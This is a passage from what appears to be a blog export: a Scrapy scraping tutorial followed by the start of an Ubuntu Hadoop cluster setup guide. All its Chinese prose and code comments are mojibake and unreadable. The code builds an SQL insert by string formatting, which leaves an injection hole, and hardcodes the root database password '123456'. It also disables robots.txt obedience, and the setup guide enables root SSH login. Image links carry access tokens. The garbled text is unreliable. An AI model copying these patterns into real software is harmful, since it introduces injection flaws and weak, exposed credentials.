scrapy.Field()\n\n```\n\nå°†first.pyæå–å‡ºçš„æ•°æ®æäº¤ç»™ç®¡é“\n\n```python\nimport scrapy\nfrom tutorial.items import TutorialItem\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # è¿”å›ä¸€ä¸ªselectorå¯¹è±¡\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # å–å‡ºæ•°æ®\n            title = title.extract()  # extract_first()å–ç¬¬ä¸€ä¸ª\n\n            # å®ä¾‹åŒ–ä¸€ä¸ªitemå¯¹è±¡,å°†è§£æåˆ°çš„æ•°æ®å­˜å…¥åˆ°è¯¥å¯¹è±¡\n            item = TutorialItem()\n            # é€šè¿‡å­—å…¸çš„æ–¹å¼è°ƒç”¨\n            item['title'] = title\n            # å°†itemå¯¹è±¡æäº¤ç»™ç®¡é“\n            yield item\n\n```\n\nåœ¨pipelines.pyä¸­é‡å†™çˆ¶ç±»æ–¹æ³•,å­˜å‚¨åˆ°æœ¬åœ°\n\n```python\nclass TutorialPipeline:\n    # é‡å†™çˆ¶ç±»æ–¹æ³•\n    f = None\n\n    def open_spider(self, spider):\n        print('æˆ‘æ˜¯open_spider,åªä¼šåœ¨çˆ¬è™«å¼€å§‹çš„æ—¶å€™æ‰§è¡Œä¸€æ¬¡')\n        self.f = open('./text1.txt', 'w', encoding='utf-8')\n\n    def close_spider(self, spider):\n        print('æˆ‘æ˜¯close_spider,åªä¼šåœ¨çˆ¬è™«å¼€å§‹çš„æ—¶å€™æ‰§è¡Œä¸€æ¬¡')\n        self.f.close()\n\n    # è¯¥æ–¹æ³•æ˜¯ç”¨æ¥æ¥æ”¶itemå¯¹è±¡çš„,ä¸€æ¬¡åªèƒ½æ¥æ”¶ä¸€ä¸ªitem,è¯´æ˜è¯¥æ–¹æ³•ä¼šè¢«å¤šæ¬¡è°ƒç”¨\n    # å‚æ•°itemå°±æ˜¯æ¥æ”¶çš„itemå¯¹è±¡\n    def process_item(self, item, spider):\n        # å­˜å‚¨åˆ°æœ¬åœ°æ–‡ä»¶\n        self.f.write(item['title'] + '\\n')\n        return item\n```\n\nåŸºäºç®¡é“å®ç°æ•°æ®çš„å¤‡ä»½\n\npipelines.py\n\n```python\nimport pymysql\n\n\nclass MysqlPipeline(object):\n    conn = None\n    cursor = None\n\n    # é‡å†™çˆ¶ç±»\n    def open_spider(self, spider):\n        # æ•°æ®åº“è¿æ¥å¯¹è±¡\n        self.conn = pymysql.Connect(host='localhost', port=3306, user='root', password='123456', charset='utf8',\n                                    db='spider')\n\n    def process_item(self, item, spider):\n        self.cursor = self.conn.cursor()\n        sql = 'insert into duanzi values(\"%s\")' % item['title']\n        # äº‹åŠ¡å¤„ç†\n        try:\n            self.cursor.execute(sql)\n            self.conn.commit()\n        except Exception as e:\n            print(e)\n            self.conn.rollback()\n        # è¿”å›itemä¼šç»™ä¸‹ä¸€ä¸ªç®¡é“ä½¿ç”¨,å¦‚æœä¸è¿”å›,ä¸‹ä¸€ä¸ªç®¡é“å°†æ¥æ”¶ä¸åˆ°\n        return item\n\n    # é‡å†™çˆ¶ç±»,å…³é—­è¿æ¥\n    def close_spider(self, spider):\n        self.cursor.close()\n        self.conn.close()\n\n```\n\nåœ¨settings.pyå¢åŠ ä¸€ä¸ªç®¡é“\n\n```python\nITEM_PIPELINES = {\n    # çˆ¬è™«æ–‡ä»¶ä¸­çš„itemåªä¼šæäº¤ç»™ä¼˜å…ˆçº§æœ€é«˜çš„é‚£ä¸€ä¸ªç®¡é“ç±»\n    'tutorial.pipelines.TutorialPipeline': 300,\n    'tutorial.pipelines.MysqlPipeline': 301,\n}\n```\n\n## æ‰‹åŠ¨è¯·æ±‚å‘é€\n\næ–°å»ºå·¥ç¨‹\n\n```bash\nchenci@MacBook-Pro scrapy %scrapy startproject HandReq\nchenci@MacBook-Pro scrapy %cd HandReq \nchenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com\n```\n\n```python\nimport scrapy\nfrom HandReq.items import HandreqItem\n\n\nclass DuanziSpider(scrapy.Spider):\n    name = 'duanzi'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://duanzixing.com/page/1/']\n\n    # é€šç”¨çš„urlæ¨¡æ¿\n    url = 'https://duanzixing.com/page/%d/'\n    page_num = 2\n\n    def parse(self, response):\n        title_list = response.xpath('/html/body/section/div/div/article[1]/header/h2/a/text()')\n        for title in title_list:\n            title = title.extract()\n            item = HandreqItem()\n            item['title'] = title\n            yield item\n\n        if self.page_num < 5:\n            # æ„é€ é¡µç \n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # å¯¹æ–°çš„urlå‘èµ·è¯·æ±‚,é€’å½’å›è°ƒè‡ªå·±\n            yield scrapy.Request(url=new_url, callback=self.parse)\n            # scrapy.FormRequest(url,callback,formdata) å‘é€postè¯·æ±‚\n\n```\n\n## äº”å¤§æ ¸å¿ƒç»„ä»¶å·¥ä½œæµç¨‹\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151340834.png?token=ARYCSAUIENI4WQ2X26Z4EQ3CQCJIM)\n\nå¼•æ“(Scrapy)\n\n    ç”¨æ¥å¤„ç†æ•´ä¸ªç³»ç»Ÿçš„æ•°æ®æµå¤„ç†, è§¦å‘äº‹åŠ¡(æ¡†æ¶æ ¸å¿ƒ)\n\nè°ƒåº¦å™¨(Scheduler)\n\n    ç”¨æ¥æ¥å—å¼•æ“å‘è¿‡æ¥çš„è¯·æ±‚, å‹å…¥é˜Ÿåˆ—ä¸­, å¹¶åœ¨å¼•æ“å†æ¬¡è¯·æ±‚çš„æ—¶å€™è¿”å›. å¯ä»¥æƒ³åƒæˆä¸€ä¸ªURLï¼ˆæŠ“å–ç½‘é¡µçš„ç½‘å€æˆ–è€…è¯´æ˜¯é“¾æ¥ï¼‰çš„ä¼˜å…ˆé˜Ÿåˆ—, ç”±å®ƒæ¥å†³å®šä¸‹ä¸€ä¸ªè¦æŠ“å–çš„ç½‘å€æ˜¯ä»€ä¹ˆ, åŒæ—¶å»é™¤é‡å¤çš„ç½‘å€\n\nä¸‹è½½å™¨(Downloader)\n\n    ç”¨äºä¸‹è½½ç½‘é¡µå†…å®¹, å¹¶å°†ç½‘é¡µå†…å®¹è¿”å›ç»™èœ˜è››(Scrapyä¸‹è½½å™¨æ˜¯å»ºç«‹åœ¨twistedè¿™ä¸ªé«˜æ•ˆçš„å¼‚æ­¥æ¨¡å‹ä¸Šçš„)\n\nçˆ¬è™«(Spiders)\n\n    çˆ¬è™«æ˜¯ä¸»è¦å¹²æ´»çš„, ç”¨äºä»ç‰¹å®šçš„ç½‘é¡µä¸­æå–è‡ªå·±éœ€è¦çš„ä¿¡æ¯, å³æ‰€è°“çš„å®ä½“(Item)ã€‚ç”¨æˆ·ä¹Ÿå¯ä»¥ä»ä¸­æå–å‡ºé“¾æ¥,è®©Scrapyç»§ç»­æŠ“å–ä¸‹ä¸€ä¸ªé¡µé¢\n\né¡¹ç›®ç®¡é“(Pipeline)\n\n    è´Ÿè´£å¤„ç†çˆ¬è™«ä»ç½‘é¡µä¸­æŠ½å–çš„å®ä½“ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯æŒä¹…åŒ–å®ä½“ã€éªŒè¯å®ä½“çš„æœ‰æ•ˆæ€§ã€æ¸…é™¤ä¸éœ€è¦çš„ä¿¡æ¯ã€‚å½“é¡µé¢è¢«çˆ¬è™«è§£æåï¼Œå°†è¢«å‘é€åˆ°é¡¹ç›®ç®¡é“ï¼Œå¹¶ç»è¿‡å‡ ä¸ªç‰¹å®šçš„æ¬¡åºå¤„ç†æ•°æ®ã€‚\n\n## è¯·æ±‚ä¼ å‚çš„æ·±åº¦çˆ¬å–-4567kan.com\n\næ–‡ä»¶ç›®å½•\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151341626.png?token=ARYCSAWOAVW6ADT6LYL7NY3CQCJMU)\n\n    metaæ˜¯ä¸€ä¸ªå­—å…¸,å¯ä»¥å°†metaä¼ ç»™callback\n        scrapy.Request(url, callback, meta)\n\n    callbackå–å‡ºå­—å…¸\n        item = response.meta['item']\n\nmove.py é¡¹ç›®æ–‡ä»¶\n\n```python\nimport scrapy\nfrom move_4567kan.items import Move4567KanItem\n\n\nclass MoveSpider(scrapy.Spider):\n    name = 'move'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.4567kan.com/frim/index1-1.html']\n\n    # æ„é€ é¡µç \n    url = 'https://www.4567kan.com/frim/index1-%d.html'\n    page_num = 2\n\n    def parse(self, response):\n        # æŠ“å–urlå’Œtitle\n        li_list = response.xpath('/html/body/div[2]/div/div[3]/div/div[2]/ul/li')\n        for li in li_list:\n            url = 'https://www.4567kan.com' + li.xpath('./div/a/@href').extract()[0]\n            title = li.xpath('./div/a/@title').extract()[0]\n\n            # ä¼ é€’ç»™item\n            item = Move4567KanItem()\n            item['title'] = title\n\n            # å¯¹è¯¦æƒ…é¡µå‘èµ·è¯·æ±‚,å›è°ƒget_detailså‡½æ•°\n            # metaè¯·æ±‚ä¼ å‚,ä»¥å­—å…¸å½¢å¼,ä¼ ç»™get_detailså‡½æ•°,å› ä¸ºitemåªèƒ½æ˜¯å”¯ä¸€\n            yield scrapy.Request(url=url, callback=self.get_details, meta={'item': item})\n\n        # çˆ¬å–å¤šé¡µ\n        if self.page_num < 5:\n            # æ„é€ é¡µç \n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # å¯¹æ–°çš„urlå‘èµ·è¯·æ±‚,é€’å½’å›è°ƒè‡ªå·±\n            yield scrapy.Request(url=new_url, callback=self.parse)\n\n    # è‡ªå®šä¹‰å‡½æ•°å»æŠ“å–è¯¦æƒ…\n    def get_details(self, response):\n        details = response.xpath('//*[@class=\"detail-content\"]/text()').extract()\n        # åˆ¤æ–­,æ²¡æœ‰è¿”å›None\n        if details:\n            details = details[0]\n        else:\n            details = None\n        # æ¥å—item\n        item = response.meta['item']\n        item['details'] = details\n        # æäº¤ç»™ç®¡é“\n        yield item\n\n```\n\nitems.py å®šä¹‰ä¸¤ä¸ªå­—æ®µ\n\n```python\nimport scrapy\n\n\nclass Move4567KanItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    details = scrapy.Field()\n\n```\n\npipelines.py æ‰“å°è¾“å‡º\n\n```python\nclass Move4567KanPipeline:\n    def process_item(self, item, spider):\n        print(item)\n        return item\n\n```\n\n## ä¸­é—´ä»¶\n\nä½œç”¨\n\n    æ‹¦æˆªè¯·æ±‚å’Œå“åº”\n\nçˆ¬è™«ä¸­é—´ä»¶\n\n    ç•¥\n\nä¸‹è½½ä¸­é—´ä»¶(æ¨è)\n\n    æ‹¦æˆªè¯·æ±‚:    \n        1.ç¯¡æ”¹è¯·æ±‚url\n        2.ä¼ªè£…è¯·æ±‚å¤´ä¿¡æ¯:\n            UA\n            Cookie\n        3.è®¾ç½®è¯·æ±‚ä»£ç†\n\n    æ‹¦æˆªå“åº”:\n        ç¯¡æ”¹å“åº”æ•°æ®\n\næ”¹å†™ä¸­é—´ä»¶æ–‡ä»¶ middlewares.py\n\n```python\n\nfrom scrapy import signals\nfrom itemadapter import is_item, ItemAdapter\n\n\nclass MiddleDownloaderMiddleware:\n\n    # æ‹¦æˆªæ‰€æœ‰è¯·æ±‚\n    # requestå°±æ˜¯æ‹¦æˆªåˆ°çš„è¯·æ±‚,spiderå°±æ˜¯çˆ¬è™«ç±»å®ä¾‹åŒ–çš„å¯¹è±¡\n    def process_request(self, request, spider):\n        print('æˆ‘æ˜¯process_request()')\n        return None\n\n    # æ‹¦æˆªæ‰€æœ‰å“åº”å¯¹è±¡\n    # requestå°±æ˜¯responseå“åº”å¯¹è±¡å¯¹åº”çš„è¯·æ±‚å¯¹è±¡,responseå°±æ˜¯æ‹¦æˆªåˆ°çš„å“åº”å¯¹è±¡\n    def process_response(self, request, response, spider):\n        print('æˆ‘æ˜¯process_response()')\n        return response\n\n    # æ‹¦æˆªå¼‚å¸¸è¯·æ±‚\n    # requestå°±æ˜¯æ‹¦æˆªåˆ°çš„å¼‚å¸¸è¯·æ±‚çš„è¯·æ±‚å¯¹è±¡\n    # ä½œç”¨:ä¿®æ­£å¼‚å¸¸è¯·æ±‚,å°†å…¶ é‡æ–°å‘é€\n    def process_exception(self, request, exception, spider):\n        print('æˆ‘æ˜¯process_exception()')\n        # pass\n```\n\nç¼–å†™çˆ¬è™«æ–‡ä»¶\n\n```python\nimport scrapy\n\n\nclass MidSpider(scrapy.Spider):\n    name = 'mid'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.baidu.com', 'https://www.sogou.com']\n\n    def parse(self, response):\n        print(response)\n\n```\n\nåœ¨é…ç½®æ–‡ä»¶setting.pyä¸­å¯ç”¨\n\n```python\nROBOTSTXT_OBEY = True\n\nDOWNLOADER_MIDDLEWARES = {\n    'middle.middlewares.MiddleDownloaderMiddleware': 543,\n}\n```\n\nå¯åŠ¨å·¥ç¨‹\n\n```bash\nchenci@MacBook-Pro middle %scrapy crawl mid\næˆ‘æ˜¯process_request()\næˆ‘æ˜¯process_request()\næˆ‘æ˜¯process_response()\næˆ‘æ˜¯process_exception()\næˆ‘æ˜¯process_response()\næˆ‘æ˜¯process_exception()\n```\n\nprocess_exception()æ–¹æ³•è®¾ç½®ä»£ç†\n\n```python\n# æ‹¦æˆªå¼‚å¸¸è¯·æ±‚\n# requestå°±æ˜¯æ‹¦æˆªåˆ°çš„å¼‚å¸¸è¯·æ±‚çš„è¯·æ±‚å¯¹è±¡\n# ä½œç”¨:ä¿®æ­£å¼‚å¸¸è¯·æ±‚,å°†å…¶ é‡æ–°å‘é€\ndef process_exception(self, request, exception, spider):\n    # è¯·æ±‚çš„ipè¢«ç¦,è¯¥è¯·æ±‚å°±ä¼šå˜æˆä¸€ä¸ªå¼‚å¸¸è¯·æ±‚,åŠ å…¥ä»£ç†\n    request.meta['proxy_'] = 'https://ip:port'\n    print('æˆ‘æ˜¯process_exception()')\n    # å°†å¼‚å¸¸çš„è¯·æ±‚ä¿®æ­£åé‡æ–°å‘é€\n    return request\n    # å¯èƒ½ä¼šé€ æˆæ­»å¾ªç¯,å› ä¸ºå¦‚æœåŠ å…¥ä»£ç†åä¾æ—§å‘ç”Ÿå¼‚å¸¸,ä¼šå†æ¬¡åŠ å…¥ä»£ç†å»è¯·æ±‚\n```\n\nprocess_request()æ–¹æ³•è®¾ç½®headers\n\n```python\ndef process_request(self, request, spider):\n    # è®¾ç½®è¯·æ±‚å¤´,ä½†ä¸€èˆ¬ä¸è¿™ä¹ˆå†™,å¯ä»¥åœ¨setting.pyä¸­è®¾ç½®å…¨å±€\n    request.headers['User-Agent'] = 'xxx'\n    request.headers['Cookie'] = 'xxx'\n    print('æˆ‘æ˜¯process_request()')\n    return None\n```\n\nprocess_response()æ–¹æ³•ç¯¡æ”¹å“åº”æ•°æ®\n\n```python\n# æ‹¦æˆªæ‰€æœ‰å“åº”å¯¹è±¡\n# requestå°±æ˜¯responseå“åº”å¯¹è±¡å¯¹åº”çš„è¯·æ±‚å¯¹è±¡,responseå°±æ˜¯æ‹¦æˆªåˆ°çš„å“åº”å¯¹è±¡\ndef process_response(self, request, response, spider):\n    # ç¯¡æ”¹å“åº”æ•°æ®\n    response.text = 'xxx'\n    print('æˆ‘æ˜¯process_response()')\n    return response\n```\n\n## å¤§æ–‡ä»¶ä¸‹è½½-çˆ¬å–jdlingyu.comå›¾ç‰‡\n\næ–‡ä»¶ç›®å½•\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151342799.png?token=ARYCSAQF2H5ORVGMPC5ZA6TCQCJQG)\n\nimg.py\n\n```python\nimport scrapy\nfrom imgdownload.items import ImgdownloadItem\n\n\nclass ImgSpider(scrapy.Spider):\n    name = 'img'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.jdlingyu.com']\n\n    def parse(self, response):\n        li_list = response.xpath('/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li')\n        for a in li_list:\n            url = a.xpath('./div/div[2]/h2/a/@href').extract()[0]\n            title = a.xpath('./div/div[2]/h2/a/text()').extract()[0]\n\n            # ä¼ é€’ç»™itme\n            item = ImgdownloadItem()\n            item['title'] = title\n\n            # å›è°ƒå¹¶ä¼ é€’å‚æ•°\n            yield scrapy.Request(url=url, callback=self.get_img_url, meta={'item': item})\n\n    # å¯¹æ¯ä¸ªå›¾é›†çš„urlå‘èµ·è¯·æ±‚\n    def get_img_url(self, response):\n        page = 0\n        item = response.meta['item']\n        # æŠ“å–æ¯å¼ å›¾ç‰‡çš„ä¸‹è½½é“¾æ¥\n        img_list = response.xpath('//*[@id=\"primary-home\"]/article/div[2]/img')\n        for scr in img_list:\n            img_url = scr.xpath('./@src').extract()[0]\n            page += 1\n            # ä¼ é€’ç»™item\n            item['img_url'] = img_url\n            item['page'] = page\n            # æäº¤ç»™ç®¡é“\n            yield item\n\n```\n\nsetting.pyå¢åŠ é…ç½®\n\n```python\nUSER_AGENT = 'ua'\nROBOTSTXT_OBEY = False\nLOG_LEVEL = 'ERROR'\n# å›¾ç‰‡å­˜æ”¾ç›®å½•\nIMAGES_STORE = './imgs'\n\n```\n\nitems.pyå¢åŠ å­—æ®µ\n\n```python\nimport scrapy\n\n\nclass ImgdownloadItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    img_url = scrapy.Field()\n    page = scrapy.Field()\n```\n\npipelines.pyå¢åŠ ç®¡é“ç±»\n```python\nimport scrapy\nfrom itemadapter import ItemAdapter\n\n# é»˜è®¤ç®¡é“ç±»æ— æ³•è¯·æ±‚å›¾ç‰‡æ•°æ®\nclass ImgdownloadPipeline:\n    def process_item(self, item, spider):\n        return item\n\n\n# æ¥å—å›¾ç‰‡åœ°å€å’Œtitle,ç„¶åå¯¹å…¶è¿›è¡Œè¯·æ±‚å­˜å‚¨åˆ°æœ¬åœ°\n# æä¾›äº†æ•°æ®ä¸‹è½½åŠŸèƒ½,ä¹Ÿå¯ä»¥ä¸‹è½½è§†é¢‘å’ŒéŸ³é¢‘\nfrom scrapy.pipelines.images import ImagesPipeline\n\n\n# ç»§æ‰¿ImagesPipelineç±»\nclass img_download(ImagesPipeline):\n    # é‡å†™ä¸‰ä¸ªçˆ¶ç±»æ–¹æ³•\n    def get_media_requests(self, item, info):\n        # ä¸‹è½½,å¹¶ä¼ å‚,å¦‚æœä¼ é€’æ•´ä¸ªitem,æœ€ååªä¼šä¸‹è½½ä¸€å¼ å›¾ç‰‡,åŸå› æœªçŸ¥\n        yield scrapy.Request(url=item['img_url'], meta={'title': item['title'], 'page': item['page']})\n\n    # è¿”å›å›¾ç‰‡ä¿å­˜è·¯å¾„\n    def file_path(self, request, response=None, info=None, *, item=None):\n        # æ‹¼æ¥è·¯å¾„\n        title = request.meta['title']\n        page = request.meta['page']\n        path = f'{title}/{page}.jpg'\n\n        # è¿”å›è·¯å¾„\n        return path\n\n    # å°†itemè¿”å›ç»™ä¸‹ä¸€ä¸ªå³å°†è¢«æ‰§è¡Œçš„ç®¡é“ç±»\n    def item_completed(self, results, item, info):\n        return item\n```\n\nsetting.pyå¢åŠ ç®¡é“ç±»\n```python\nITEM_PIPELINES = {\n   #'imgdownload.pipelines.ImgdownloadPipeline': 300,\n   'imgdownload.pipelines.img_download': 300,\n}\n```\n\nè¿è¡Œæ•ˆæœ\n\n![](https://raw.githubusercontent.com/chencicici/images/main/202205151342947.png?token=ARYCSATQHIG5XPI3W7VHBBTCQCJR2)\n\n## CrawlSpider æ·±åº¦çˆ¬å–\næ˜¯ä»€ä¹ˆ\n\n    æ˜¯Spiderçš„ä¸€ä¸ªå­ç±»,ä¹Ÿå°±æ˜¯çˆ¬è™«æ–‡ä»¶çš„çˆ¶ç±»\n    \nä½œç”¨:ç”¨ä½œäºå…¨ç«™æ•°æ®çš„çˆ¬å–\n    \n    å°†ä¸€ä¸ªé¡µé¢ä¸‹æ‰€æœ‰çš„é¡µç è¿›è¡Œçˆ¬å–\n\nåŸºæœ¬ä½¿ç”¨\n    \n    1.åˆ›å»ºä¸€ä¸ªå·¥ç¨‹\n    2.åˆ›å»ºä¸€ä¸ªåŸºäºCrawlSpiderç±»çš„çˆ¬è™«æ–‡ä»¶\n        crapy genspider -t crawl main www.xxx.com\n    3.æ‰§è¡Œå·¥ç¨‹\n\nç¼–å†™å·¥ç¨‹æ–‡ä»¶main.py\n```python\nimport scrapy\nfrom scrapy.linkextractors import LinkExtractor\nfrom scrapy.spiders import CrawlSpider, Rule\n\n\nclass MainSpider(CrawlSpider):\n    name = 'main'\n    #allowed_domains = ['https://www.mn52.com/']\n    start_urls = ['https://www.mn52.com/fj/']\n\n    # é“¾æ¥æå–å™¨,æ ¹æ®allowé‡Œçš„æ­£åˆ™æ¥æå–url\n    rules = (\n        # å¯¹æå–çš„urlå‘èµ·è¯·æ±‚,ç„¶åå›è°ƒè§£æ\n        # å¦‚æœallowä¸ºç©º å°†æŠ“å–æ­¤é¡µé¢ä¸‹çš„é“¾æ¥\n        Rule(LinkExtractor(allow=r'list_8_\\d.html'), callback='parse_item', follow=True),\n    )\n\n    def parse_item(self, response):\n        print(response)\n        item = {}\n        return item\n\n```\næ‰§è¡Œå·¥ç¨‹\n    \n    å¯ä»¥çœ‹åˆ°æŠ“å–äº†æ‰€æœ‰é¡µç çš„url\n```bash\nchenci@MacBook-Pro crawl %scrapy crawl main\n<200 https://www.mn52.com/fj/list_8_2.html>\n<200 https://www.mn52.com/fj/list_8_3.html>\n<200 https://www.mn52.com/fj/list_8_4.html>\n<200 https://www.mn52.com/fj/list_8_8.html>\n<200 https://www.mn52.com/fj/list_8_5.html>\n<200 https://www.mn52.com/fj/list_8_7.html>\n<200 https://www.mn52.com/fj/list_8_9.html>\n<200 https://www.mn52.com/fj/list_8_6.html>\n```\n\n\n","tags":["æ•™ç¨‹","çˆ¬è™«","scrapy"],"categories":["çˆ¬è™«"]},{"title":"ubuntuä¸‹å¤§æ•°æ®é›†ç¾¤æ­å»º","url":"/2022/03/01/ubuntuä¸‹hadoopé›†ç¾¤æ­å»º/","content":"### ä¸€.é…ç½®ip(ä¸‰ä¸ªèŠ‚ç‚¹)\nè‡ªubuntu17ä¹‹åå¤šäº†ä¸€ç§é…ç½®æ–¹å¼æ›´åŠ é«˜æ•ˆ,ä¹Ÿå°±æ˜¯netplan\n\n1.1ç¼–è¾‘é…ç½®æ–‡ä»¶\n```bash\nroot@master:/etc/netplan# gedit /etc/netplan/01-network-manager-all.yaml\n```\né…ç½®å†…å®¹å¦‚ä¸‹,`æ³¨æ„ç¼©è¿›`\n```yaml\nnetwork:\n version: 2\n renderer: NetworkManager\n ethernets:\n    ens33:\n      dhcp4: no\n      dhcp6: no\n      addresses: [192.168.10.101/24]\n      gateway4: 192.168.10.1\n      nameservers:\n        addresses: [8.8.8.8, 192.168.10.1]\n```\n1.2ä½¿é…ç½®ç”Ÿæ•ˆ\n```bash\nroot@master:/etc/netplan# netplan apply\n```\nå¦‚æœæ²¡æœ‰æŠ¥é”™åˆ™é…ç½®æˆåŠŸ\n\n### äºŒ.é…ç½®ä¸»æœºåå’Œä¸»æœºåæ˜ å°„(ä¸‰ä¸ªèŠ‚ç‚¹)\n1.1é…ç½®ä¸»æœºåå¹¶æŸ¥çœ‹\n```bash\né‡å¯åç”Ÿæ•ˆ\nroot@master:/etc/netplan# hostnamectl set-hostname master\nroot@master:/etc/netplan# hostname\n```\n1.2é…ç½®ä¸»æœºåæ˜ å°„\n```bash\nroot@master:/etc/netplan# gedit /etc/hosts\n```\næ·»åŠ ä»¥ä¸‹å†…å®¹\n```bash\n192.168.10.101 master\n192.168.10.102 slave1\n192.168.10.103 slave2\n```\n1.3pingæµ‹è¯•\n```bash\næœ‰ä»¥ä¸‹å›æ˜¾è¯æ˜é…ç½®æˆåŠŸ\nroot@master:/etc/netplan# ping slave2\nPING slave2 (192.168.10.103) 56(84) bytes of data.\n64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms\n64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms\n```\n1.4å°†hostsæ–‡ä»¶åˆ†å‘ç»™å­èŠ‚ç‚¹\n```bash\nroot@master:/etc/netplan# scp /etc/hosts root@slave1:/etc/\nè¾“å…¥yeså†è¾“å…¥å¯†ç \n```\n\n### ä¸‰.é…ç½®sshå…å¯†ç™»å½•(ä¸‰ä¸ªèŠ‚ç‚¹)\nå› ä¸ºUbuntuå¹¶ä¸è‡ªå¸¦sshæœåŠ¡æ‰€ä»¥è¦å®‰è£…sshå¹¶é…ç½®å…è®¸rootè¿œç¨‹ç™»å½•\n```bash\nä¸‹è½½\nsudo apt-get install openssh-server\nå¯åŠ¨\nsudo service ssh start\né…ç½®\nsudo vim /etc/ssh/sshd_config\næ·»åŠ ä¸€æ¡\nPermitRootLogin yes\n```\n1.ç”Ÿæˆå¯†é’¥\n```bash\nroot@master:~# ssh-keygen -t rsa\nä¸€ç›´å›è½¦\n```\n2.å°†å¯†é’¥å†™å…¥authorized.keysæ–‡ä»¶\n```bash\nroot@master:~# cd .ssh/\nroot@master:~/.ssh# cat id_rsa.pub >> authorized_keys\n\n```\n3.åœ¨å¦å¤–ä¸¤ä¸ªå­èŠ‚ç‚¹æ‰§è¡Œä»¥ä¸Šæ“ä½œ,å¹¶å°†authorized.keysçš„å†…å®¹å¤åˆ¶è¿›masterä¸»æœºçš„authorized.keysæ–‡ä»¶æœ«å°¾,æˆåŠŸåå¦‚ä¸‹\n```bash\nroot@master:~/.ssh# cat authorized.keys \nssh-dss AAAAB3NzaC1kc3MAAACBAIzJrAXCuK15C+mq3TkdFFJUJiuY9rMo6L6LoU+naCEKJNKfRDXXAXDcRC2TJK5JqnWHuexfOusYZS/kpRU4JO1S4VGzq446r5QM19c7xH3TkE2A2W2Z9AA/7G+UHzqyHWQ6gDRIsqqsF6MlJUtOO7x3XtNUVYrtIzvUeqTbXrbJAAAAFQCsjTDCWxn2PU5WobBN/xYTxS9vdwAAAIBcM2X2tlkwnmpNcm3a1Cf4addU395AfJfhOwdqacHSCdiaNSlx7kVkd8T1Hk+gvF0KzP4KbjqiGWsGEiaYdlU4Ujrei+VplG8moa4GcCA/wUzpAioeULCP+0+870/+NwFUt7XKhYk9llUrh56LWev5c5YC3aNQ0GzElBxjUj8v4gAAAIBpUWTTkmdeL7ploxSCR56Js0pMFJiGvKP6tMkc3UL5Vwl5RDqJt+eFd31SDVJVVEK3vX06wujOlDbHwdIfpE48y2dN7nRn5bK3ccg1yo7Cq7Vtj4TlODYTkPYxXaR2e8dqW9bg8anXvaCI7AylRwPYNnQIgcjPeC4qJsRuMq4Mag== root@master\nssh-dss AAAAB3NzaC1kc3MAAACBAMxF+Q5Kg1DluBqo0vZKPlE0uB2+1cDTn/f2xN0ug5mYa3WDpC36p8P2iQ4IrZEp7BqFEiQSstbZd+Im4qpaBRlHnWZhym5oOqY2a4JVsrAtyTObYFM/+/eEtQ/0Bl6UxeRKkWWPuZwbtYREEnbJ2VwLzvIJEBDVkZcccY58TO8LAAAAFQC41GJzzSEGbZLDCu2Fgzo3iml/ZQAAAIBpWqD1HHm5gTyp/6h+hCEDMP1cOOl11e+f4ZO+vhpYm+AXqpEbmMr2UTSBlc93PdJRxiIAIKidWmcLaaSuLDYWoeDDcFGCclz9bCoXZmeOVoAe096jyNFPZGorb7mqnif3oRI5hkqsmph2AX/9n90taaLUF5VrgJVEAOPLkjZ+IAAAAIEAsc7MCMYn7phJIACMypSeeWkmjUisRxVEp6u6WWHQ3GsImNkjR7UmFVxnpYOikexsPsbhlXahTIas7SQiPNRsgxi2nDBwauEvkRHQID5LbjFiIp97xbrSg8T0H23MXlBbI/MycFcyuxBIUOL5zSrz8CcUG6uQtLDMGAEVkCHORCU= root@slave1\nssh-dss AAAAB3NzaC1kc3MAAACBANwhno/+fLpWNOg1NOrBQ+qs7XWLZeu+Xxl/g5eJOD9+qaQKTWLOYfgyez38cpqjZ9r39tKRR5HQ7RVlM0tJicGgz+jCdtRoQKs6W5mc3SCmW+u+ILMxxTqdUHUKsNq4NauoVcSduq4ot8HKpi2GBGWE1MCNgCaSnH6TB8tvl49lAAAAFQCnfx5p+/KbSsrlSFo9BYuAhEuI7QAAAIA4lsxJjI3bn/FQsSjzcjIyRLiut432/i/QngE7Y9UwQGXKY9x8z7EksXDpdswo2M2cBSZsrelSnoiUYHjusSfMTptzdT8WUWCutCd7Kn1zU4fPJCM4gTNuECjHaWU/t7BVJXHGkB6eWErcHxnm6iILVLCFf9wm8oPMjRJmLLQGhQAAAIEAkA+YrcoTQfuZbS8ACHN3zkvg1/gAmx26owiZsMrSaV1rbrJ6WgWCX+Ux9CHIkKK4MZrJrXVQpoal5/PEPw0OCZepCHOGVLNcrhyhKNov1EzSC664Mb0l+9bHh+zXjv/X0yrMB1bY16eNMBCnx0YsJ5vuXZtZRg9ms6dEh5eA/LY= root@slave2\n```\n4.åˆ†å‘ç»™å¦å¤–ä¸¤å°å­èŠ‚ç‚¹\n```bash\nroot@master:~/.ssh# scp ./authorized.keys root@slave1:/root/.ssh/\nroot@master:~/.ssh# scp ./authorized.keys root@slave2:/root/.ssh/\n```\n5.æµ‹è¯•å…å¯†ç™»å½•\n```bash\nssh master\nssh slave1\nssh slave2\n```\n### 